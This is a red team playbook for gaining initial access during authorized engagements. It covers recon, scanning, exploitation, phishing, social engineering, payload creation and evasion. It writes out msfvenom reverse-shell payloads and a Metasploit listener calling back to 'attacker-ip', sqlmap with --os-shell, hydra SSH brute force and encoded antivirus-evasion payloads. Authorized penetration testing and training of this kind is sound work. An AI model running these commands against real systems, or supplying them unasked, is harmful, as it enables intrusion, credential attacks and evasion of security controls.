# Initial Access Playbook - Red Team Operations

## Overview
This playbook outlines systematic approaches for gaining initial access to target environments during authorized red team engagements using CyberKit tools.

## ⚠️ **IMPORTANT DISCLAIMER**
This playbook is intended ONLY for authorized security testing, penetration testing, and red team exercises. Always ensure you have proper written authorization before conducting any testing activities.

## Prerequisites
- Written authorization for red team engagement
- Clearly defined scope and rules of engagement
- CyberKit environment with all tools configured
- Target environment information and constraints
- Communication channels established with blue team (if applicable)

## Phase 1: Reconnaissance and Intelligence Gathering

### 1.1 Passive Intelligence Collection
```bash
# OSINT gathering
./offensive/redteam-init.sh --api-recon -c "target-org" -t target.com

# Social media intelligence
# (Manual research using LinkedIn, Twitter, Facebook)
# Document employees, organizational structure, technologies used

# Public documentation review
# Search for: network diagrams, employee manuals, job postings
# Look for technology stack information
```

### 1.2 DNS and Subdomain Enumeration
```bash
# Comprehensive subdomain discovery
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -o amass-subdomains.txt

# DNS record enumeration
dig any target.com
dig mx target.com
dig txt target.com

# Certificate transparency logs
# Check crt.sh for additional subdomains
```

### 1.3 Network Infrastructure Mapping
```bash
# External IP range identification
whois target.com | grep -E "(NetRange|CIDR)"

# ASN enumeration
amass intel -org "Target Organization"

# Cloud infrastructure detection
./offensive/webapp-scan.sh -t target.com --cloud-detection
```

## Phase 2: External Attack Surface Analysis

### 2.1 Port Scanning and Service Discovery
```bash
# External port scanning (authorized targets only)
nmap -sS -sV -O target.com -oA external-scan

# Web service identification
httpx -l subdomains.txt -title -tech-detect -status-code -o web-services.txt

# SSL/TLS configuration analysis
nmap --script ssl-enum-ciphers -p 443 target.com
```

### 2.2 Web Application Assessment
```bash
# Web application reconnaissance
./offensive/webapp-scan.sh -t target.com --comprehensive

# Directory and file enumeration
gobuster dir -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Technology stack fingerprinting
whatweb target.com
nuclei -u target.com -tags tech,panel,cms
```

### 2.3 Email Infrastructure Analysis
```bash
# Email server identification
dig mx target.com

# Email security record analysis
dig txt target.com | grep -E "(spf|dmarc|dkim)"

# Email address harvesting (from public sources)
# Use theHarvester or similar tools for public email collection
```

## Phase 3: Vulnerability Identification

### 3.1 Automated Vulnerability Scanning
```bash
# Web application vulnerabilities
nuclei -u target.com -severity critical,high,medium -o web-vulns.txt

# Network service vulnerabilities
nmap --script vuln target.com -oA vuln-scan

# CVE-based scanning
nuclei -u target.com -tags cve -o cve-results.txt
```

### 3.2 Manual Vulnerability Assessment
```bash
# SQL injection testing
sqlmap -u "https://target.com/search?q=test" --batch --level=3

# Cross-site scripting (XSS) testing
# Manual testing with various payloads in forms and parameters

# Server-side request forgery (SSRF) testing
# Test for SSRF in file upload, URL parameters, etc.
```

## Phase 4: Initial Access Vectors

### 4.1 Web Application Exploitation
```bash
# Exploit identified web vulnerabilities
# Example: SQL injection with SQLMap
sqlmap -u "https://target.com/vulnerable.php?id=1" --os-shell

# File upload vulnerabilities
# Upload web shells through vulnerable upload functionality

# Authentication bypass
# Test for default credentials, weak passwords, bypass techniques
```

### 4.2 Email-Based Attacks (Phishing)
```bash
# Phishing infrastructure setup
# (Use dedicated phishing frameworks like Gophish - not included in CyberKit)

# Email template creation
# Create convincing emails based on reconnaissance

# Payload delivery
# Craft malicious attachments or links for initial access
```

### 4.3 Remote Service Exploitation
```bash
# SSH brute force (if authorized)
hydra -L users.txt -P passwords.txt ssh://target.com

# RDP exploitation
# Test for weak RDP credentials or vulnerabilities

# VPN exploitation
# Test VPN endpoints for vulnerabilities or weak authentication
```

## Phase 5: Social Engineering

### 5.1 Phone-Based Social Engineering
```bash
# Employee directory compilation
# Gather employee information from public sources

# Pretext development
# Create convincing scenarios for phone-based attacks

# Information gathering calls
# Conduct authorized social engineering calls (with proper approval)
```

### 5.2 Physical Security Assessment
```bash
# Facility reconnaissance
# Observe physical security controls (with authorization)

# Badge cloning preparation
# Assess RFID/proximity card security (if in scope)

# Tailgating opportunities
# Identify physical access control weaknesses
```

## Phase 6: Payload Development and Delivery

### 6.1 Custom Payload Creation
```bash
# Generate reverse shells
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=4444 -f exe -o payload.exe

# PowerShell payloads
msfvenom -p windows/powershell_reverse_tcp LHOST=attacker-ip LPORT=4444 -f raw > payload.ps1

# Linux payloads
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=4444 -f elf > payload
```

### 6.2 Command and Control Setup
```bash
# Metasploit listener setup
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST attacker-ip; set LPORT 4444; exploit"

# Alternative C2 frameworks
# Cobalt Strike, Empire, or other approved C2 tools
```

## Phase 7: Living Off the Land Techniques

### 7.1 Fileless Attacks
```bash
# PowerShell-based attacks
# Use legitimate PowerShell functionality for malicious purposes

# WMI exploitation
# Leverage Windows Management Instrumentation

# Registry manipulation
# Use registry for persistence and execution
```

### 7.2 Legitimate Tool Abuse
```bash
# PSExec for lateral movement
# Use legitimate administrative tools

# Task scheduler abuse
# Schedule malicious tasks using schtasks

# Service manipulation
# Create or modify services for persistence
```

## Phase 8: Evasion Techniques

### 8.1 Antivirus Evasion
```bash
# Payload encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker-ip LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o encoded-payload.exe

# File signature modification
# Modify file headers and signatures to avoid detection

# Process injection
# Inject payloads into legitimate processes
```

### 8.2 Network Detection Evasion
```bash
# Traffic encryption
# Use encrypted communication channels

# Domain fronting
# Hide C2 traffic behind legitimate domains

# Traffic timing
# Randomize communication intervals to avoid detection
```

## Phase 9: Documentation and Reporting

### 9.1 Attack Path Documentation
```bash
# Create attack timeline
echo "# Initial Access Attack Path" > /home/cyberkit/reports/attack-path.md
echo "## Reconnaissance Phase" >> /home/cyberkit/reports/attack-path.md
echo "- Discovered subdomains: $(wc -l < subdomains.txt)" >> /home/cyberkit/reports/attack-path.md
echo "- Identified vulnerabilities: $(wc -l < web-vulns.txt)" >> /home/cyberkit/reports/attack-path.md
```

### 9.2 Evidence Collection
```bash
# Screenshot collection
mkdir -p /home/cyberkit/evidence/initial-access/
# Take screenshots of successful exploits, access gained, etc.

# Log preservation
cp /var/log/msfconsole.log /home/cyberkit/evidence/initial-access/
```

## Common Initial Access Vectors

### 1. Web Application Vulnerabilities
- SQL injection leading to remote code execution
- File upload vulnerabilities
- Remote file inclusion (RFI) / Local file inclusion (LFI)
- Server-side template injection (SSTI)
- Deserialization vulnerabilities

### 2. Email-Based Attacks
- Phishing emails with malicious attachments
- Credential harvesting through fake login pages
- Business email compromise (BEC)
- Watering hole attacks

### 3. Network Service Exploitation
- Unpatched services with known vulnerabilities
- Default or weak credentials
- Misconfigurations in network services
- VPN vulnerabilities

### 4. Social Engineering
- Phone-based pretexting
- Physical security bypasses
- USB drops and malicious media
- Impersonation attacks

## Tools Used
- **nuclei** - Vulnerability scanning
- **nmap** - Network discovery and service enumeration
- **subfinder/amass** - Subdomain enumeration
- **sqlmap** - SQL injection exploitation
- **msfvenom** - Payload generation
- **hydra** - Brute force attacks
- **httpx** - HTTP service analysis

## Legal and Ethical Considerations

### Rules of Engagement
1. **Written Authorization**: Always obtain explicit written permission
2. **Scope Definition**: Stay within defined testing boundaries
3. **Data Handling**: Follow data protection and privacy requirements
4. **Service Availability**: Avoid disrupting business operations
5. **Responsible Disclosure**: Report findings through proper channels

### Documentation Requirements
- Maintain detailed logs of all activities
- Document methodology and tools used
- Record timestamps for all actions
- Preserve evidence of successful attacks
- Create executive and technical reports

## Best Practices
1. **Reconnaissance First**: Thorough information gathering before attacks
2. **Stealth Operations**: Avoid detection by security monitoring
3. **Multiple Vectors**: Test various attack paths for comprehensive coverage
4. **Realistic Scenarios**: Use attack vectors relevant to the organization
5. **Continuous Learning**: Stay updated with latest attack techniques
6. **Team Coordination**: Maintain communication with engagement team

## Post-Exploitation Considerations
Once initial access is gained:
1. **Establish Persistence**: Ensure continued access
2. **Privilege Escalation**: Gain higher-level permissions
3. **Lateral Movement**: Expand access to other systems
4. **Data Identification**: Locate sensitive information
5. **Exfiltration Simulation**: Test data protection controls
6. **Clean Up**: Remove artifacts while preserving evidence

## Defensive Recommendations
Based on common attack vectors:
1. **Web Application Security**: Regular security assessments and patching
2. **Email Security**: Anti-phishing training and technical controls
3. **Network Segmentation**: Limit lateral movement opportunities
4. **Monitoring and Detection**: Implement comprehensive security monitoring
5. **Access Controls**: Strong authentication and authorization
6. **Security Awareness**: Regular employee security training